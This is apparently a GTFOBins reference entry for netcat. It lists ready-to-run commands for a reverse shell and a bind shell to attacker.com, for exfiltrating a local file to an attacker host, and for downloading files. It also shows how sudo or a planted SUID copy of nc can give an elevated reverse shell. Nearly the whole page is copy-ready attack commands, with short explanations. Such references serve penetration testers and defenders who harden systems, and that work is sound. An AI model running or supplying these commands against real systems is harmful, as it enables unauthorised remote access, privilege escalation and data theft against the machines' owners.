# GTFOBin: nc

## Reverse shell

It can send back a reverse shell to a listening attacker to open a remote network access.

Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.

```
RHOST=attacker.com
RPORT=12345
nc -e /bin/sh $RHOST $RPORT
```

## Bind shell

It can bind a shell to a local port to allow remote network access.

Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.

```
LPORT=12345
nc -l -p $LPORT -e /bin/sh
```

## File upload

It can exfiltrate files on the network.

Send a local file via TCP. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file.

```
RHOST=attacker.com
RPORT=12345
LFILE=file_to_send
nc $RHOST $RPORT < "$LFILE"
```

## File download

It can download remote files.

Fetch a remote file via TCP. Run `nc target.com 12345 < "file_to_send"` on the attacker box to send the file.

```
LPORT=12345
LFILE=file_to_save
nc -l -p $LPORT > "$LFILE"
```

## Sudo

If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.

```
RHOST=attacker.com
RPORT=12345
sudo nc -e /bin/sh $RHOST $RPORT
```

## Limited SUID

If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via `system()`-like invocations) it only works on systems like Debian (<= Stretch) that allow the default `sh` shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.

Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.

```
sudo install -m =xs $(which nc) .

RHOST=attacker.com
RPORT=12345
./nc -e /bin/sh $RHOST $RPORT
```